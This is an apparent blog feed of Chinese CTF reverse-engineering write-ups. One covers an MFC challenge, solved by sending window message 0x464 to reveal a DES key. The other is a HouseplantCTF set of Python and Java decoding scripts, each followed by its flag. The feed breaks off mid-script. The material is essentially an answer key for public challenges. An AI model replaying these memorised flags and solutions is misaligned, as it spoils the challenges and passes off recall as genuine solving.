        <content type="html"><![CDATA[<html><head></head><body><p>这题就是一个脑洞题，但可以大概的了解一下windows编程</p><span id="more"></span><p>查壳发现是虚拟机<br><img src="https://s1.ax1x.com/2020/03/24/8b4mz4.png" alt="8b4mz4.png"></p><p>IDA打开，脱壳怕是不可能的了，只能换其他方法。</p><p><del>这里用面向大佬博客做题法</del></p><p>因为<strong>Flag就在控件里</strong>，干脆spy++查看一下</p><p><img src="https://s1.ax1x.com/2020/03/24/8b4uQJ.png" alt="8b4uQJ.png"></p><p>找到句柄，用xspy查一查</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">OnMsg</span>:<span class="hljs-number">0464</span>,func= <span class="hljs-number">0</span>x<span class="hljs-number">00402170</span>(mfc逆向-<span class="hljs-number">200</span>.exe+ <span class="hljs-number">0</span>x<span class="hljs-number">002170</span> )</span><br></pre></td></tr></tbody></table></figure><p>找到了一个奇怪的东西，但是接下来不知道该怎么做了</p><p><del>然后偷瞄大佬博客</del></p><p>大佬掐指一算应该发个消息，vs启动</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">HWND h = <span class="hljs-built_in">FindWindowA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">"Flag就在控件里"</span>);</span><br><span class="line"><span class="hljs-keyword">if</span> (h)</span><br><span class="line">{</span><br><span class="line"><span class="hljs-built_in">SendMessage</span>(h, <span class="hljs-number">0x464</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里只是简单的用到了两个函数</p><p>第一个<code>FindWindowA</code>，定义如下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">HWND <span class="hljs-title">FindWindowA</span><span class="hljs-params">(</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  LPCSTR lpClassName,  {窗口的类名，可为空}</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  LPCSTR lpWindowName  {窗口的标题名}</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>这个函数不查找子窗口（<code>FindWindowEx</code>），返回的是这个窗口的句柄，其实就是我们之前用spy++查询到的句柄，也可以用下面的代码</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">auto</span> h = <span class="hljs-built_in">HWND</span>(<span class="hljs-number">0xa505f4</span>);</span><br></pre></td></tr></tbody></table></figure><p>作用是一样的，找到句柄之后就可以发消息，用到了<code>SendMessage</code></p><p>定义如下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT SendMessage（HWND hWnd，UINT Msg，WPARAM wParam，LPARAM IParam）</span><br></pre></td></tr></tbody></table></figure><blockquote><p>参数<br>hWnd：指定要接收消息的窗口的句柄。如果此参数为HWND_BROADCAST，则消息将被发送到系统中所有顶层窗口，包括无效或不可见的非自身拥有的窗口、被覆盖的窗口和弹出式窗口，但消息不被发送到子窗口。<br>Msg：指定被发送的消息。<br>wParam：指定附加的消息特定信息。<br>IParam：指定附加的消息特定信息。<br>返回值：返回值指定消息处理的结果，依赖于所发送的消息。</p></blockquote><p>所以给这个控件发个<code>0x464</code>，然后窗体里面的内容变了，变成了<code>{I am a Des key}</code></p><p>有了key，但是密文是什么……</p><p>大佬掐指一算，之前这个控件有个奇怪的类名<code>944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</code></p><p>解密得到flag</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">thIs_Is_real_kEy_hahaaa</span></span><br></pre></td></tr></tbody></table></figure><hr><p><del>不仅懂得比大佬少，脑洞也比不过大佬</del></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> mfc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HouseplantCTF-wp</title>
      <link href="/2020/03/21/2020-HouseplantCTF/"/>
      <url>/2020/03/21/2020-HouseplantCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>最近没有太多时间，这个比赛又比较简单，就干脆直接放脚本了</p><span id="more"></span><h3 id="beginners"><a href="#beginners" class="headerlink" title="beginners"></a>beginners</h3><h4 id="beginner-1"><a href="#beginner-1" class="headerlink" title="beginner 1"></a>beginner 1</h4><p>base64</p><h4 id="beginner-2"><a href="#beginner-2" class="headerlink" title="beginner 2"></a>beginner 2</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x5f</span>,</span><br><span class="line">          <span class="hljs-number">0x61</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x69</span>,</span><br><span class="line">          <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7d</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(i)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># rtcp{bob_you_suck_at_being_encouraging}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="reverse-engineering"><a href="#reverse-engineering" class="headerlink" title="reverse-engineering"></a>reverse-engineering</h3><h4 id="Fragile"><a href="#Fragile" class="headerlink" title="Fragile"></a>Fragile</h4><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.exit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.File;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        String flag = <span class="hljs-string">"h1_th3r3_1ts_m3"</span>;</span><br><span class="line">        String theflag = <span class="hljs-string">"ÐdØÓ§åÍaèÒÁ¡"</span>;</span><br><span class="line">        String f=<span class="hljs-string">""</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; flag.length(); i++) {</span><br><span class="line">            f += (<span class="hljs-keyword">char</span>) ((<span class="hljs-keyword">int</span>) (theflag.charAt(i)) - (<span class="hljs-keyword">int</span>) (flag.charAt(i)));</span><br><span class="line">        }</span><br><span class="line">        System.out.println(f);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// rtcp{h3y_1ts_n0t_b4d}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h4><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">rtcp</span>{tH<span class="hljs-number">1</span>s_i<span class="hljs-number">5</span>_<span class="hljs-number">4</span>_r<span class="hljs-number">3</span>aL_fL<span class="hljs-number">4</span>g_s<span class="hljs-number">0</span>_Do_sUbm<span class="hljs-number">1</span>T_<span class="hljs-number">1</span>t!}</span><br></pre></td></tr></tbody></table></figure><h4 id="PZ"><a href="#PZ" class="headerlink" title="PZ"></a>PZ</h4><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">rtcp</span>{iT<span class="hljs-number">5</span>_s<span class="hljs-number">1</span>mPlY_<span class="hljs-number">1</span>n_tH<span class="hljs-number">3</span>_C<span class="hljs-number">0</span>d<span class="hljs-number">3</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="LEMON"><a href="#LEMON" class="headerlink" title="LEMON"></a>LEMON</h4><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">rtcp</span>{y<span class="hljs-number">34</span>H_tHiS_a<span class="hljs-number">1</span>nT_sEcuR<span class="hljs-number">3</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="SQUEEZY"><a href="#SQUEEZY" class="headerlink" title="SQUEEZY"></a>SQUEEZY</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">en = <span class="hljs-string">'HxEMBxUAURg6I0QILT4UVRolMQFRHzokRBcmAygNXhkqWBw='</span></span><br><span class="line">enc = base64.b64decode(en)</span><br><span class="line">key = <span class="hljs-string">"meownyameownyameownyameownyameownya"</span></span><br><span class="line">flag = <span class="hljs-string">''</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(key, enc))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># rtcp{y0u_L3fT_y0uR_x0r_K3y_bEh1nD!}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="thedanzman"><a href="#thedanzman" class="headerlink" title="thedanzman"></a>thedanzman</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">en = <span class="hljs-string">"=ZkXipjPiLIXRpIYTpQHpjSQkxIIFbQCK1FR3DuJZxtPAtkR"</span></span><br><span class="line">en = en[::-<span class="hljs-number">1</span>]</span><br><span class="line">key = <span class="hljs-string">"nyameowpurrpurrnyanyapurrpurrnyanya"</span></span><br><span class="line">key = codecs.encode(key, <span class="hljs-string">"rot_13"</span>)</span><br><span class="line">d = codecs.encode(en, <span class="hljs-string">'rot_13'</span>)</span><br><span class="line">e = base64.b64decode(d)</span><br><span class="line">f = <span class="hljs-string">''</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(key, e))</span><br><span class="line"><span class="hljs-built_in">print</span>(f)</span><br><span class="line"><span class="hljs-comment"># rtcp{n0w_tH4T_w45_m0r3_cH4lL3NgiNG}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Breakable"><a href="#Breakable" class="headerlink" title="Breakable"></a>Breakable</h4><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.exit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.File;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        String flag = <span class="hljs-string">"k33p_1t_in_pl41n"</span>;</span><br><span class="line">        String theflag = <span class="hljs-string">"ÒdÝ¾¤¤¾ÙàåÐcÝÆ¥ÌÈáÏÜ¦aã"</span>;</span><br><span class="line">        String f1=<span class="hljs-string">""</span>;</span><br><span class="line">        String f2=<span class="hljs-string">""</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; flag.length()-<span class="hljs-number">2</span>; i++) {</span><br><span class="line">            f1 += (<span class="hljs-keyword">char</span>) ((<span class="hljs-keyword">int</span>) (theflag.charAt(i+<span class="hljs-number">14</span>)) - (<span class="hljs-keyword">int</span>) (flag.charAt(i+<span class="hljs-number">2</span>)));</span><br><span class="line">        }</span><br><span class="line">        System.out.println(f1);</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; flag.length()-<span class="hljs-number">2</span>; i++) {</span><br><span class="line">            f2 += (<span class="hljs-keyword">char</span>) ((<span class="hljs-keyword">int</span>) (theflag.charAt(i)) - (<span class="hljs-keyword">int</span>) (flag.charAt(i)));</span><br><span class="line">        }</span><br><span class="line">        System.out.println(f2);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// rtcp{0mg_1m_s0_pr0ud_}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Bendy"><a href="#Bendy" class="headerlink" title="Bendy"></a>Bendy</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="hljs-string">"r34l_g4m3rs_eXclus1v3"</span></span><br><span class="line">theflag = <span class="hljs-string">"ÄÑÓ¿ÂÒêáøz§è§ñy÷¦"</span></span><br><span class="line">f1 = theflag[:<span class="hljs-number">9</span>]</span><br><span class="line">f2 = theflag[<span class="hljs-number">9</span>:]</span><br><span class="line">ff = <span class="hljs-string">""</span></span><br><span class="line">f = <span class="hljs-string">""</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):</span><br><span class="line">    ff += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(f2[i]) - <span class="hljs-number">20</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):</span><br><span class="line">    ff += f1</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>, <span class="hljs-number">15</span>):</span><br><span class="line">    f += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(ff[i - <span class="hljs-number">3</span>]) - <span class="hljs-built_in">ord</span>(flag[i]))</span><br><span class="line">f += <span class="hljs-string">" "</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):</span><br><span class="line">    f += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(ff[i]) - <span class="hljs-built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>, <span class="hljs-number">21</span>):</span><br><span class="line">    f += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(ff[i - <span class="hljs-number">3</span>]) - <span class="hljs-built_in">ord</span>(flag[i - <span class="hljs-number">3</span>]))</span><br><span class="line"><span class="hljs-built_in">print</span>(f)</span><br><span class="line"><span class="hljs-comment">#rtcp{hop3_y0ur3_h4v1ng_fun}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Tough"><a href="#Tough" class="headerlink" title="Tough"></a>Tough</h4><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>[] realflag = {<span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">23</span>, <span class="hljs-number">8</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">20</span>, <span class="hljs-number">16</span>, <span class="hljs-number">10</span>, <span class="hljs-number">22</span>, <span class="hljs-number">12</span>, <span class="hljs-number">19</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>[] therealflag = {<span class="hljs-number">20</span>, <span class="hljs-number">16</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">3</span>, <span class="hljs-number">18</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">23</span>, <span class="hljs-number">8</span>, <span class="hljs-number">17</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">22</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Integer, Character&gt; theflags = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Integer, Character&gt; theflags0 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Integer, Character&gt; theflags1 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Integer, Character&gt; theflags2 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> m = <span class="hljs-keyword">true</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> g = <span class="hljs-keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">createMap</span><span class="hljs-params">(HashMap owo, String input, <span class="hljs-keyword">boolean</span> uwu)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (uwu) {</span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; input.length(); i++) {</span><br><span class="line">                owo.put(realflag[i], input.charAt(i));</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; input.length(); i++) {</span><br><span class="line">                owo.put(therealflag[i], input.charAt(i));</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        String flag = <span class="hljs-string">"ow0_wh4t_4_h4ckr_y0u_4r3"</span>;</span><br><span class="line">        createMap(theflags0, flag, g);</span><br><span class="line">        createMap(theflags2, flag, m);</span><br><span class="line">        <span class="hljs-keyword">int</span>[] thefinalflag = {<span class="hljs-number">157</span>, <span class="hljs-number">157</span>, <span class="hljs-number">236</span>, <span class="hljs-number">168</span>, <span class="hljs-number">160</span>, <span class="hljs-number">162</span>, <span class="hljs-number">171</span>, <span class="hljs-number">162</span>, <span class="hljs-number">165</span>, <span class="hljs-number">199</span>, <span class="hljs-number">169</span>, <span class="hljs-number">169</span>, <span class="hljs-number">160</span>, <span class="hljs-number">194</span>, <span class="hljs-number">235</span>, <span class="hljs-number">207</span>, <span class="hljs-number">227</span>, <span class="hljs-number">210</span>, <span class="hljs-number">157</span>, <span class="hljs-number">203</span>, <span class="hljs-number">227</span>, <span class="hljs-number">104</span>, <span class="hljs-number">212</span>, <span class="hljs-number">202</span>};</span><br><span class="line">        String s=<span class="hljs-string">""</span>;</span><br><span class="line">        <span class="hljs-keyword">char</span>[] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">24</span>];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>; p &lt; thefinalflag.length; p++) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (thefinalflag[p] &gt;= <span class="hljs-number">156</span> &amp;&amp; thefinalflag[p] &lt;= <span class="hljs-number">166</span>)</span><br><span class="line">                thefinalflag[p] -= <span class="hljs-number">10</span>;</span><br><span class="line">            thefinalflag[p] -= theflags0.get(p);</span><br><span class="line"><span class="hljs-comment">//            s+=(char)(thefinalflag[p]);</span></span><br><span class="line">        }</span><br><span class="line"><span class="hljs-comment">//        System.out.println(s);</span></span><br><span class="line">        thefinalflag[<span class="hljs-number">8</span>]+=<span class="hljs-number">10</span>;</span><br><span class="line">        thefinalflag[<span class="hljs-number">5</span>]+=<span class="hljs-number">10</span>;</span><br><span class="line"><span class="hljs-comment">//        System.out.println((char)thefinalflag[8]);</span></span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span 